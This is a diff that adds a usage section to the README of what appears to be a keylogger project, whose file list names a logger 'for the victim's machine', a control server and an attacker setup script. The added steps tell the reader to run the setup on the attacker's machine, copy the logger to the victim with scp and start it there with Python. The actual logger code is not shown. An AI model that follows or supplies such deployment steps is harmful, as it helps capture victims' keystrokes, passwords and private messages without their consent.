@@ -22,3 +22,20 @@ keystroke-logger/
 ├── logger.py         # Keylogger script for the victim's machine.
 ├── controller.py     # Control server for starting/stopping the logger.
 ├── setup.sh          # Setup script for the attacker's machine
+```
+# Usage
+1. Run setup.sh on the Attacker's Machine:
+```bash
+chmod +x setup.sh
+./setup.sh
+```
+2. Deploy logger.py to the Victim's Machine: Use SCP, Netcat, or another transfer method to send logger.py to the victim:
+
+```bash
+scp logger.py user@victim_ip:/path/to/destination
+```
+3. Ensure the victim has Python 3 installed to run the script:
+```bash
+python3 logger.py
+```
+
